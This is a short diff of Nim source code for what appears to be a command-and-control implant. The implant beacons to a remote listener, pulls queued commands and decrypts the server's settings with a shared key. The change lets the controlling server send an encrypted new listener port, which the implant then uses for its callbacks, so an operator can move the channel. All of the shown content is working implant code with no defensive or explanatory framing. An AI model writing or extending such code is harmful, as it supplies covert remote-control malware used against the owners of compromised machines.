@@ -17,6 +17,7 @@ type
         listenerHost* : string
         listenerIp* : string
         listenerPort* : string
+        newListenerPort* : string
         registerPath* : string
         sleepTime* : int
         sleepJitter* : float
@@ -68,7 +69,10 @@ proc doRequest(li : var Listener, path : string, postKey : string = "", postValu
         if li.listenerHost != "":
             target = target & li.listenerHost
         else:
-            target = target & li.listenerIp & ":" & li.listenerPort
+            if li.newListenerPort != "":
+                target = target & li.listenerIp & ":" & li.newListenerPort
+            else:
+                target = target & li.listenerIp & ":" & li.listenerPort
         target = target & path
 
         # GET request
@@ -159,6 +163,7 @@ proc init*(li: var Listener) : void =
         li.randomUserAgents = false
         li.randomUserAgentsCounter = 0
         li.changeEndPoints = false
+        li.newListenerPort = li.listenerPort
     else:
         li.initialized = false
 
@@ -206,6 +211,7 @@ proc getQueuedCommand*(li: var Listener) : (string, string, seq[string]) =
         try:
             # check for userAgent status
             li.randomUserAgents = parseBool(decryptData(parseJson(res.body)["s2"].getStr(), li.cryptKey).replace("\'", "\""))
+            li.newListenerPort = decryptData(parseJson(res.body)["p3"].getStr(), li.cryptKey)
             li.changeEndPoints = parseBool(decryptData(parseJson(res.body)["s4"].getStr(), li.cryptKey).replace("\'", "\""))
 
             # Attempt to parse task (parseJson() needs string literal... sigh)
